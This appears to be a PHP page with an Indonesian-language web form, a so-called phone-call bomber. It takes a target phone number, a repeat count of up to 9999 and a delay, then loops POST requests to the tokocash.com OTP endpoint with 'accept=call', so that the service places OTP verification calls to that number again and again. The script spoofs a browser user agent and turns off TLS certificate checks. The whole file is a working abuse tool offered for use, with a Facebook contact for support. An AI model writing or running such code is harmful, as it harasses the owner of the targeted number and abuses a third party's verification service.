<?php

    error_reporting(0);
  $nope = trim($_POST["nope"]);
  $jumlah = trim($_POST["jumlah"]);
  $delay = trim($_POST["delay"]);
  $submit = $_POST["submit"];
  
function tokcall($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"msisdn=".$no."&accept=call");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.tokocash.com/oauth/otp');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}

    if(isset($submit)){
     tokcall($nope,$jumlah,$delay);
}
?>
<!DOCUMENT html>
<html>
 <head>
 <title>TOKO PEDIA CALL</title>
</title></head>
<style type="text/css">
body{
    background-color:yellow;
    
}
</style>

<body>
<div style= "border:2px solid#002222 " >
<div style= "border:2px solid#222222 " >
<div style= "border:2px solid#333333 " >
<div style= "border:2px solid#555555 " >
<div style= "border:2px solid#777777 " >
<div style= "border:2px solid#999999 " >
<center>
<b>BOM Telpon toko pedia</b>
</center>
</div>
</div>
</div>
</div>
</div>
</div>
<div style="border-style:dotted;"><form action="" method="POST">
<span style="font-size:30px;color:black;">Nomor :</span>
<input type="text" name="nope" placeholder="0852xxxxxxxx">
<br>
<span style="font-size:30px;color:black;">Jumlah :</span><input type="text" name="jumlah" placeholder="0-9999">
<br>u
<span style="font-size:30px;color:black;">Delay :</span><input type="text" name="delay" placeholder="0,005">
<br>
<?php
  for($kaka =0; $kaka < 56; $kaka++){
echo"&nbsp";
}
?>
<button type="submit" name="submit">Tembak</button>
</div>
<div style="border-style:solid;">
<h2 style="font-size:20;color:black;">Apabila tools tidak jalan kontak kami di <a href="https://facebook.com/kakaroto.kakaroto.3328">Facebook</a> terimakasih
</div>
</body>

</html>